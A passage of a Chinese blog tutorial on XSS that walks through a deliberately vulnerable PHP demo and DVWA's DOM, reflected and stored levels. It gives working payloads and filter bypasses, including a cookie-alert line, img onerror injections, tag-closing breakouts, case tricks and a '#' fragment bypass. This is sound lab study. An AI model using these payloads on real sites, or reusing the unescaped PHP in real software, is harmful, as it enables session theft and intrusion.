+<p>这就是最基本的 <strong>反射型的 XSS 漏洞</strong> ，这种漏洞数据流向是： <strong>前端–&gt;后端–&gt;前端</strong></p>
+<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>源代码</p>
+<p>前端</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>存储型XSS<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;action2.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>        输入你的ID：  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> /&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        输入你的Name：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> /&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>后端action2.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;id&quot;</span>];<br>	<span class="hljs-variable">$name</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>];<br>	<span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br>	<span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;test&quot;</span>);<br>	<br>	<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;insert into xss value (<span class="hljs-subst">$id</span>,&#x27;<span class="hljs-subst">$name</span>&#x27;)&quot;</span>;<br>	<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>后端show2.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;locahost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br>	<span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;test&quot;</span>);<br>	<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from xss where id=1&quot;</span>;<br>	<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>	<span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>))&#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>	&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311205234936.png" srcset="/img/loading.gif" lazyload alt="image-20230311205234936"></p>
+<p>我们输入 1 和 <code>&lt;script&gt;alert(\&#39;hack\&#39;)&lt;/script&gt;</code> ，注意，这里的 hack 的单引号要进行转义，因为 sql 语句中的 $name 是单引号的，所以这里不转义的话就会闭合 sql 语句中的单引号。</p>
+<p>然后当其他用户访问 show2.php 页面时，我们插入的 XSS 代码就执行了。<br><strong>存储型 XSS</strong> 的数据流向是：<strong>前端–&gt;后端–&gt;数据库–&gt;后端–&gt;前端</strong></p>
+<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>low</p>
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314111625701.png" srcset="/img/loading.gif" lazyload alt="image-20230314111625701"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">/?default=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311211117713.png" srcset="/img/loading.gif" lazyload alt="image-20230311211117713"></p>
+<script>alert(document.cookie)</script> #可以弹出cookie
+
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311211336184.png" srcset="/img/loading.gif" lazyload alt="image-20230311211336184"></p>
+<p>medium</p>
+<p>源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !<span class="hljs-title function_ invoke__">is_null</span> (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br>    <span class="hljs-variable">$default</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>];<br>    <br>    <span class="hljs-comment"># Do not allow script tags</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span> (<span class="hljs-variable">$default</span>, <span class="hljs-string">&quot;&lt;script&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>array_key_exists — 检查数组里是否有指定的键名或索引</p>
+<p>stripos — 查找字符串首次出现的位置（不区分大小写）</p>
+<p>此处过滤了&lt;script 使用img标签&lt;img src&#x3D;1 οnerrοr&#x3D;(‘xss’)&gt;发现没有任何弹窗</p>
+<p>发现已经插入了value属性中。我们需要插入到值中，那么可以闭合select和option标签来插入。</p>
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314113530028.png" srcset="/img/loading.gif" lazyload alt="image-20230314113530028"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">?default=<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br>?default=<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314113613135.png" srcset="/img/loading.gif" lazyload alt="image-20230314113613135"></p>
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314113232825.png" srcset="/img/loading.gif" lazyload alt="image-20230314113232825"></p>
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314112958648.png" srcset="/img/loading.gif" lazyload alt="image-20230314112958648"></p>
+<p>high</p>
+<p>源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !<span class="hljs-title function_ invoke__">is_null</span> (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br><br>    <span class="hljs-comment"># White list the allowable languages</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;French&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;English&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;German&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;Spanish&quot;</span>:<br>            <span class="hljs-comment"># ok</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>            <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>白名单过滤，只能选择四种语言</p>
+<p>这里可以采用#方法来绕过服务器端的业务操作</p>
+<p>#是一个浏览器指导字符，该字符后面的的数据不会被传到服务器后端，所以可以通过该符号来绕过后端代码的过滤，可以直接与浏览器进行交互</p>
+<p>注意：#这个方法仅适用于DOM型<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=xss&spm=1001.2101.3001.7020">xss</a>注入)</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">#<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314214536278.png" srcset="/img/loading.gif" lazyload alt="image-20230314214536278"></p>
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314215331489.png" srcset="/img/loading.gif" lazyload alt="image-20230314215331489"></p>
+<p>impossible</p>
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314215622412.png" srcset="/img/loading.gif" lazyload alt="image-20230314215622412"></p>
+<p>不进行url编码</p>
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314215737945.png" srcset="/img/loading.gif" lazyload alt="image-20230314215737945"></p>
+<p>high:<option value="" + lang + "">“ + decodeURI(lang) + “</option></p>
+<p>impossible:<option value="" + lang + "">“ + (lang) + “</option></p>
+<h3 id="反射型-1"><a href="#反射型-1" class="headerlink" title="反射型"></a>反射型</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311211432135.png" srcset="/img/loading.gif" lazyload alt="image-20230311211432135"></p>
+<p>源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);  <span class="hljs-comment"># 未进行xss过滤</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123; <span class="hljs-comment"># 未进行过滤</span><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>
+
+<p>medium</p>
+<p>源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);   <span class="hljs-comment"># 禁用xss过滤器</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );   <span class="hljs-comment">#使用str_replace函数进行替换</span><br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>str_replace — 子字符串替换，区分大小写</p>
+<p>使用大小写过滤</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311212248550.png" srcset="/img/loading.gif" lazyload alt="image-20230311212248550"></p>
+<p>high</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>preg_replace — 执行一个正则表达式的搜索和替换</p>
+<p>添加了对大小写绕过的判断，而且根据正则表达式过滤，提交内容只要有script顺序出现的字母都一律过滤掉，只是过滤了script标签，但是有一些javascript事件后仍然能执行javascript代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311214122921.png" srcset="/img/loading.gif" lazyload alt="image-20230311214122921"></p>
+<p>impossible</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。</p>
+<ul>
+<li>某类字符在 HTML 中有特殊用处，如需保持原意，需要用 HTML 实体来表达。 本函数会返回字符转义后的表达。 如需转换子字符串中所有关联的名称实体，使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.htmlentities.php">htmlentities()</a> 代替本函数。</li>
+</ul>
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311214358573.png" srcset="/img/loading.gif" lazyload alt="image-20230311214358573"></p>
+<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>未进行过滤，直接写入xss代码</p>
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311215448348.png" srcset="/img/loading.gif" lazyload alt="image-20230311215448348"></p>
+<p>medium</p>
